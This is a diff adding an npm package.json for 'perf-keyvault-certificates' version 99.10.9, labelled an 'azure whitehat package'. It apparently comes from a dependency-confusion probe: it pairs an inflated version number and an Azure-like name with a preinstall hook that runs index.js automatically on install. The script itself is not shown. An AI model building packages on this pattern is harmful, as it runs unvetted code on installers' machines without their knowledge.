@@ -1,0 +1,39 @@
+{
+    "name": "perf-keyvault-certificates",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-keyvault-certificates@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-HLFEZjuh7H2eFXD/vDsGKbDyC2x38Hg/QLAtsvxGUhsLqqjrGRYRHvJMKp0w6wrPZvV4p7MNto6oxIcB4PW4jA==",
+        "shasum": "e4092db0dabf56ddb446a177cc9409d6ed8b857f",
+        "tarball": "https://registry.npmjs.org/perf-keyvault-certificates/-/perf-keyvault-certificates-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3590,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon1iCRA9TVsSAnZWagAACewP/2ib4iv4CJnnw41hcyuK\nQD+4oui9pn4cEODTstCy0WkvufTDXVxR8iW4+6Dc/dN+dkDKJuJM8Tg77HJN\nVr18WAl2/GbLYT9E04/ErcrdIUYCzas9Se7kr7GpAtqZTJ13pN6BDxr9JQwN\nTYjZ/KMAh6tVFlsVwHM2b8kIE448zNIPbIAqIfaShVmExCmSSeDVzrF5Xt8b\n6vQa1wiqWbiDRNRYlju96K4gJ0n5HVTIFndZ/w/7VsMLhYA57vUPK8YbNf/s\nyFg2h3NVKVNIMtmWU+2//B4uMtZGdPgGkQNPlNbKgv/nhfL7le0ygUydTYG1\n66fi3ObsHva1ojuEYgSWR4XdeydkR5lhsHCt2o4F5ZBUTgEuKFrNtZgkYDHy\nN87QhZdbRyZC2koZuR6ICwl5leEFd9Qia5t4k501x22Fpt7gPpzRDQQcgXhy\npMAI+GvDn+90tkbqHvCJi4gr6qqEUg731oQOewc26x5VTX3xEEofC0Hy+OXE\ns0oMynllpkOrSkZktv/RekdEiFYJ2jbs7jlv+vNbojKCjUqaQfLnhFto2hob\n743xEqsauOvS2AOunplGKbYWCHE+qv9yrFVUzdasw6n2BX6EmIjOf3FH8N4m\n+nqjFCwXSwBlvzix9kH87GzNVOdLi9sh9RMdARDWwMExUCcv6LLP7mxdv46d\nvphN\r\n=ce1o\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-keyvault-certificates_99.10.9_1638038881992_0.309672844537225"
+    },
+    "_hasShrinkwrap": false
+}
